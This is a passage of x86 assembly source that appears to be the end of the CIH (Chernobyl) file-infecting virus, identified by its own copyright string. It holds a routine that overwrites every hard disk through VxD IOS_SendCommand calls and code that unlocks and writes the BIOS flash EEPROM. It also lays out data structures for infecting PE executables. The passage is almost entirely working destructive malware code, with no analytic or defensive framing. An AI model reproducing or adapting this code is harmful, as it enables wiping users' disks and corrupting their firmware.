; * 000F0000 - 000FFFFF *
; *    (   64 KB   )    *
; ***********************
									; or al,10h
			mov	word ptr (BooleanCalculateCode-@10)[esi], 100ch
			call	esi

; ***************************
; * Kill All HardDisk       *
; ***************************************************
; * IOR Structure of IOS_SendCommand Needs          *
; ***************************************************
; * ?? ?? ?? ?? 01 00 ?? ?? 01 05 00 40 ?? ?? ?? ?? *
; * 00 00 00 00 00 00 00 00 00 08 00 00 00 10 00 c0 *
; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? *
; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? *
; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 80 ?? ?? *
; ***************************************************

KillHardDisk:
			xor	ebx, ebx
			mov	bh, FirstKillHardDiskNumber
			push	ebx
			sub	esp, 2ch
			push	0c0001000h
			mov	bh, 08h
			push	ebx
			push	ecx
			push	ecx
			push	ecx
			push	40000501h
			inc	ecx
			push	ecx
			push	ecx

			mov	esi, esp
			sub	esp, 0ach

LoopOfKillHardDisk:
			int	20h
			dd	00100004h	; VXDCall IOS_SendCommand

			cmp	word ptr [esi+06h], 0017h
			je	KillNextDataSection

ChangeNextHardDisk:
			inc	byte ptr [esi+4dh]

			jmp	LoopOfKillHardDisk

KillNextDataSection:
			add	dword ptr [esi+10h], ebx
			mov	byte ptr [esi+4dh], FirstKillHardDiskNumber

			jmp	LoopOfKillHardDisk

; ***************************
; * Enable EEPROM to Write  *
; ***************************

EnableEEPROMToWrite:
			mov	[eax], cl
			mov	[ecx], al
			mov	byte ptr [eax], 80h
			mov	[eax], cl
			mov	[ecx], al

			ret

; ***************************
; * IO for EEPROM           *
; ***************************

IOForEEPROM:
@10			=	IOForEEPROM

			xchg	eax, edi
			xchg	edx, ebp
			out	dx, eax

			xchg	eax, edi
			xchg	edx, ebp
			in	al, dx

BooleanCalculateCode	=	$
			or	al, 44h

			xchg	eax, edi
			xchg	edx, ebp
			out	dx, eax

			xchg	eax, edi
			xchg	edx, ebp
			out	dx, al

			ret

; *********************************************************
; *			Static Data                       *
; *********************************************************

LastVxDCallAddress	=	IFSMgr_Ring0_FileIO
VxDCallAddressTable	db	00h
			db	IFSMgr_RemoveFileSystemApiHook-_PageAllocate
			db	UniToBCSPath-IFSMgr_RemoveFileSystemApiHook
			db	IFSMgr_Ring0_FileIO-UniToBCSPath

VxDCallIDTable		dd	00010053h, 00400068h, 00400041h, 00400032h
VxDCallTableSize	=	($-VxDCallIDTable)/04h

; *********************************************************
; *                Virus Version Copyright                *
; *********************************************************

VirusVersionCopyright	db	'CIH v'
			db	MajorVirusVersion+'0'
			db	'.'
			db	MinorVirusVersion+'0'
			db	' TTIT'

; *********************************************************
; *			Virus Size                        *
; *********************************************************

VirusSize			=	$
;				+ SizeOfVirusCodeSectionTableEndMark(04h)
;				+ NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)
;				+ SizeOfTheFirstVirusCodeSectionTable(04h)

; *********************************************************
; *			Dynamic Data                      *
; *********************************************************

VirusGameDataStartAddress	=	VirusSize
@6				=	VirusGameDataStartAddress
OnBusy				db	0
FileModificationTime		dd	?

FileNameBuffer		db	FileNameBufferSize dup(?)
@7			=	FileNameBuffer

DataBuffer		=	$
@8			=	DataBuffer
NumberOfSections	dw	?
TimeDateStamp		dd	?
SymbolsPointer		dd	?
NumberOfSymbols		dd	?
SizeOfOptionalHeader	dw	?
_Characteristics	dw	?
Magic			dw	?
LinkerVersion		dw	?
SizeOfCode		dd	?
SizeOfInitializedData	dd	?
SizeOfUninitializedData	dd	?
AddressOfEntryPoint	dd	?
BaseOfCode		dd	?
BaseOfData		dd	?
ImageBase		dd	?
@9			=	$
SectionAlignment	dd	?
FileAlignment		dd	?
OperatingSystemVersion	dd	?
ImageVersion		dd	?
SubsystemVersion	dd	?
Reserved		dd	?
SizeOfImage		dd	?
SizeOfHeaders		dd	?
SizeOfImageHeaderToRead		=	$-NumberOfSections

NewAddressOfEntryPoint	=	DataBuffer	; DWORD
SizeOfImageHeaderToWrite	=	04h

StartOfSectionTable	=	@9
SectionName		=	StartOfSectionTable	; QWORD
VirtualSize		=	StartOfSectionTable+08h	; DWORD
VirtualAddress		=	StartOfSectionTable+0ch	; DWORD
SizeOfRawData		=	StartOfSectionTable+10h	; DWORD
PointerToRawData	=	StartOfSectionTable+14h	; DWORD
PointerToRelocations	=	StartOfSectionTable+18h	; DWORD
PointerToLineNumbers	=	StartOfSectionTable+1ch	; DWORD
NumberOfRelocations	=	StartOfSectionTable+20h	; WORD
NumberOfLinenNmbers	=	StartOfSectionTable+22h	; WORD
Characteristics		=	StartOfSectionTable+24h	; DWORD
SizeOfScetionTable	=	Characteristics+04h-SectionName

; *********************************************************
; *		Virus Total Need Memory                   *
; *********************************************************

VirusNeedBaseMemory	=	$

VirusTotalNeedMemory	=	@9
;				+ NumberOfSections(??)*SizeOfScetionTable(28h)
;				+ SizeOfVirusCodeSectionTableEndMark(04h)
;				+ NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)
;				+ SizeOfTheFirstVirusCodeSectionTable(04h)

; *********************************************************
; *********************************************************

VirusGame               ENDS

                        END     FileHeader